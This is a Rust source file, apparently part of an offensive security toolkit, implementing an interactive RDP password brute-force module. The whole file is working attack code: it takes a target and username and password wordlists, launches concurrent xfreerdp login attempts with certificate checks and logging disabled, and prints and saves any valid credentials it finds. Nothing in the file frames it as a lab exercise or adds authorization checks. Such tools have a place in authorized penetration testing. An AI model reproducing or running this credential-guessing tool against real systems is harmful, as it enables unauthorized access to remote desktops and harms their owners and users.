use anyhow::Result;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Path, PathBuf},
    sync::Arc,
};
use tokio::{
    process::Command,
    sync::Mutex,
    time::{sleep, Duration},
};

pub async fn run(target: &str) -> Result<()> {
    println!("=== RDP Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("RDP Port", "3389")?;
        match input.parse() {
            Ok(p) => break p,
            Err(_) => println!("Invalid port. Try again."),
        }
    };

    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.parse() {
            Ok(n) if n > 0 => break n,
            _ => println!("Invalid number. Try again."),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "rdp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;

    let addr = format_socket_address(target, port);
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", addr);

    let users = load_lines(&usernames_file)?;
    let pass_file = File::open(&passwords_file)?;
    let pass_buf = BufReader::new(pass_file);
    let pass_lines: Vec<_> = pass_buf.lines().filter_map(Result::ok).collect();

    let mut idx = 0;
    for pass in pass_lines {
        if *stop.lock().await {
            break;
        }

        let userlist = if combo_mode {
            users.clone()
        } else {
            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
        };

        let mut handles = vec![];

        for user in userlist {
            let addr = addr.clone();
            let user = user.clone();
            let pass = pass.clone();
            let found = Arc::clone(&found);
            let stop = Arc::clone(&stop);

            let handle = tokio::spawn(async move {
                if *stop.lock().await {
                    return;
                }

                match try_rdp_login(&addr, &user, &pass).await {
                    Ok(true) => {
                        println!("[+] {} -> {}:{}", addr, user, pass);
                        found.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                        if stop_on_success {
                            *stop.lock().await = true;
                        }
                    }
                    Ok(false) => {
                        log(verbose, &format!("[-] {} -> {}:{}", addr, user, pass));
                    }
                    Err(e) => {
                        log(verbose, &format!("[!] {}: error: {}", addr, e));
                    }
                }

                sleep(Duration::from_millis(10)).await;
            });

            handles.push(handle);

            if handles.len() >= concurrency {
                for h in handles.drain(..) {
                    let _ = h.await;
                }
            }
        }

        for h in handles {
            let _ = h.await;
        }

        idx += 1;
    }

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials:");
        for (host, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host, user, pass);
        }

        if let Some(path) = save_path {
            let filename = get_filename_in_current_dir(&path);
            let mut file = File::create(&filename)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("[+] Results saved to '{}'", filename.display());
        }
    }

    Ok(())
}

async fn try_rdp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    let mut child = Command::new("xfreerdp")
        .arg(format!("/v:{}", addr))
        .arg(format!("/u:{}", user))
        .arg(format!("/p:{}", pass))
        .arg("/cert:ignore")
        .arg("/timeout:5000")
        .arg("/log-level:OFF")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let status = child.wait().await?;
    Ok(status.success())
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}: ", msg);
        std::io::Write::flush(&mut std::io::stdout())?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("This field is required.");
        }
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", msg, default);
    std::io::Write::flush(&mut std::io::stdout())?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default = if default_yes { "y" } else { "n" };
    loop {
        print!("{} (y/n) [{}]: ", msg, default);
        std::io::Write::flush(&mut std::io::stdout())?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("Invalid input. Please enter 'y' or 'n'.");
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .filter(|l| !l.trim().is_empty())
        .collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input: &str) -> PathBuf {
    let name = Path::new(input)
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    PathBuf::from(format!("./{}", name))
}

// —— updated helper to handle any number of brackets —— 
fn format_socket_address(ip: &str, port: u16) -> String {
    // Strip all existing brackets from the ends, no matter how many layers
    let trimmed = ip.trim_matches(|c| c == '[' || c == ']').to_string();
    // If it still contains a colon, assume IPv6 and wrap in one pair of brackets
    if trimmed.contains(':') {
        format!("[{}]:{}", trimmed, port)
    } else {
        format!("{}:{}", trimmed, port)
    }
}
